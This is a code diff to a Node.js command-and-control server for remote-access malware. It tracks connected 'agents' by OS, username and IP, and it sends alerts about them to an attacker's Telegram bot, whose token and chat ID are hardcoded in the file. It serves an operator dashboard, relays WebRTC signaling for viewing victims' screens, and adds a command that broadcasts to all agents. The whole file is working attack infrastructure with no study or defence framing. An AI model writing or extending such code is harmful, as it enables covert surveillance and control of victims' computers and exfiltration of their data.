@@ -2,6 +2,8 @@ const express = require('express');
 const http = require('http');
 const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
+const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -12,25 +14,54 @@ const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
 
 let clients = {};
+let logBuffer = [];
+const MAX_LOGS = 500;
 
 // --- HELPER FUNCTIONS ---
+function logToFile(msg) {
+ const timestamp = new Date().toISOString();
+ const line = `[${timestamp}] ${msg}`;
+ logBuffer.push(line);
+ if (logBuffer.length > MAX_LOGS) logBuffer.shift();
+ console.log(line);
+ broadcastLogToAdmins(line);
+}
+
 function notifyTelegram(msg) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
-    require('https').get(url, (res) => {}).on('error', (e) => console.log(`[TG Error] ${e.message}`));
+ const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
+ require('https').get(url, (res) => {}).on('error', (e) => logToFile(`[TG ERROR] ${e.message}`));
+}
+
+function notifyAdmin(id, msg) {
+ wss.clients.forEach(client => {
+ if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+ client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
+ }
+ });
 }
 
 function broadcastToAdmin(sourceId, data) {
-    wss.clients.forEach(client => {
-        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
-            client.send(JSON.stringify({ targetId: sourceId, ...data }));
-        }
-    });
+ wss.clients.forEach(client => {
+ if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+ client.send(JSON.stringify({ targetId: sourceId, ...data }));
+ }
+ });
+}
+
+function broadcastLogToAdmins(line) {
+ wss.clients.forEach(client => {
+ if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+ client.send(JSON.stringify({ type: 'system_log', message: line }));
+ }
+ });
 }
 
 // --- HTTP ROUTING ---
+app.use(express.static(__dirname)); // Serves index.html/admin.html if present
+
 app.get('/', (req, res) => {
-    // Serves the Admin Dashboard directly from memory
-    const htmlContent = `
+ // Serve the admin dashboard directly from memory
+ const htmlContent = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -97,7 +128,7 @@ app.get('/', (req, res) => {
                         renderUsers();
                     }
                 } else if (data.type === 'system') {
-                    addLog(data.message, 'blue');
+                    addLog(data.message, "blue");
                 } else if (data.type === 'screen_data') {
                     addLog(\`📺 Screen update from \${data.id}\`, 'blue');
                     if (!users[data.id]) {
@@ -107,6 +138,14 @@ app.get('/', (req, res) => {
                     renderUsers();
                 } else if (data.type === 'system_log') {
                     addLog(data.message, 'white');
+                } else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
+                    // Store signaling data for when joinUser is clicked
+                    if (!users[data.targetId]) {
+                        users[data.targetId] = { status: 'Connecting...', logs: [], info: {}, lastSeen: Date.now() };
+                    }
+                    users[data.targetId].signalingData = data; // Store for later use
+                    renderUsers();
+                    addLog(\`[SIG] Received \${data.type} for \${data.targetId}\`, 'blue');
                 }
             } catch (e) { console.error(e); }
         };
@@ -153,79 +192,126 @@ app.get('/', (req, res) => {
         }
 
         function joinUser(id) {
-            alert(\`Initiating connection to \${id}...\n(Note: Ensure signaling data is exchanged)\`);
-            addLog(\`[ADMIN] Requested join to \${id}\`, 'blue');
+            // If we have stored signaling data, send it back to the target
+            if (users[id] && users[id].signalingData) {
+                const sigData = users[id].signalingData;
+                // Send offer/answer/candidate back to the target agent
+                ws.send(JSON.stringify({
+                    type: sigData.type,
+                    targetId: id,
+                    sdp: sigData.sdp,
+                    candidate: sigData.candidate
+                }));
+                addLog(\`[ADMIN] Sent \${sigData.type} to \${id}\`, 'green');
+            } else {
+                // If no signaling data yet, just request a connection
+                ws.send(JSON.stringify({
+                    type: 'request_join',
+                    targetId: id,
+                    from: null // Admin ID would be tracked here
+                }));
+                addLog(\`[ADMIN] Requested join to \${id}\`, 'blue');
+            }
+            
+            // Visual feedback
+            const card = document.querySelector(\`button[onclick="joinUser('\${id}')"]\`).parentElement;
+            card.style.borderColor = '#4ade80';
+            setTimeout(() => card.style.borderColor = '#3b82f6', 500);
         }
     </script>
 </body>
 </html>
-    `;
-    res.writeHead(200, { 'Content-Type': 'text/html' });
-    res.end(htmlContent);
+ `;
+ res.writeHead(200, { 'Content-Type': 'text/html' });
+ res.end(htmlContent);
+});
+
+app.get('/health', (req, res) => {
+ res.writeHead(200, { 'Content-Type': 'text/plain' });
+ res.end('OK');
 });
 
 // --- WEBSOCKET HANDLING ---
 wss.on('connection', (ws, req) => {
-    let id = uuidv4().substr(0, 8);
-    ws.id = id;
-    clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
+ let id = uuidv4().substr(0, 8);
+ ws.id = id;
+ clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
 
-    ws.send(JSON.stringify({ type: 'registered', id: id }));
+ logToFile(`[+] Client Connected: ${id}`);
+ ws.send(JSON.stringify({ type: 'registered', id: id }));
 
-    let pingInterval = setInterval(() => {
-        if (ws.readyState === WebSocket.OPEN) {
-            ws.ping();
-        } else {
-            clearInterval(pingInterval);
-        }
-    }, 25000);
+ // Heartbeat
+ let pingInterval = setInterval(() => {
+ if (ws.readyState === WebSocket.OPEN) {
+ ws.ping();
+ } else {
+ clearInterval(pingInterval);
+ }
+ }, 25000);
 
-    ws.on('message', (msgRaw) => {
-        try {
-            const data = JSON.parse(msgRaw);
-            
-            if (data.type === 'register_admin') {
-                clients[id].isAdmin = true;
-                return;
-            }
+ ws.on('message', (msgRaw) => {
+ try {
+ const data = JSON.parse(msgRaw);
+ logToFile(`[MSG] Received from ${id}: ${data.type}`);
 
-            if (data.type === 'info') {
-                clients[id].info = data;
-                clients[id].lastSeen = Date.now();
-                notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
-                broadcastToAdmin(id, data);
-                notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
-            } 
-            else if (data.type === 'heartbeat') {
-                clients[id].lastSeen = Date.now();
-            } 
-            else if (['offer', 'answer', 'candidate'].includes(data.type)) {
-                // Forward signaling data to the specific target
-                if (data.targetId && clients[data.targetId]) {
-                    const targetWs = clients[data.targetId].ws;
-                    if (targetWs.readyState === WebSocket.OPEN) {
-                        targetWs.send(JSON.stringify(data));
-                    }
-                }
-            } 
-            else {
-                if (!clients[id].info && !clients[id].isAdmin) {
-                    clients[id].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
-                    notifyAdmin(id, `📺 Screen Active: ${id}`);
-                }
-                broadcastToAdmin(id, data);
-            }
-        } catch (e) {}
-    });
+ if (data.type === 'register_admin') {
+ clients[id].isAdmin = true;
+ logToFile(`[ADMIN] Connected with ID: ${id}`);
+ return;
+ }
 
-    ws.on('close', () => {
-        delete clients[id];
-        notifyAdmin(id, '🔴 User Disconnected');
-        notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
-    });
+ if (data.type === 'info') {
+ clients[id].info = data;
+ clients[id].lastSeen = Date.now();
+ notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
+ broadcastToAdmin(id, data);
+ notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
+ } 
+ else if (data.type === 'heartbeat') {
+ clients[id].lastSeen = Date.now();
+ } 
+ else if (['offer', 'answer', 'candidate'].includes(data.type)) {
+ // Forward signaling data to the specific target
+ if (data.targetId && clients[data.targetId]) {
+ const targetWs = clients[data.targetId].ws;
+ if (targetWs.readyState === WebSocket.OPEN) {
+ targetWs.send(JSON.stringify(data));
+ }
+ }
+ } 
+ else if (data.type === 'join_all') {
+ // Broadcast join request to all other agents
+ Object.keys(clients).forEach(cid => {
+ if (cid !== id && clients[cid].ws.readyState === WebSocket.OPEN) {
+ clients[cid].ws.send(JSON.stringify({
+ type: 'join_request',
+ from: id,
+ timestamp: Date.now()
+ }));
+ }
+ });
+ }
+ else {
+ if (!clients[id].info && !clients[id].isAdmin) {
+ clients[id].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
+ notifyAdmin(id, `📺 Screen Active: ${id}`);
+ }
+ broadcastToAdmin(id, data);
+ }
+ } catch (e) {
+ logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
+ }
+ });
+
+ ws.on('close', () => {
+ delete clients[id];
+ notifyAdmin(id, '🔴 User Disconnected');
+ notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
+ logToFile(`[-] Client Disconnected: ${id}`);
+ });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`C2 Server running on port ${PORT}`);
+ logToFile(`C2 Server running on port ${PORT}`);
 });
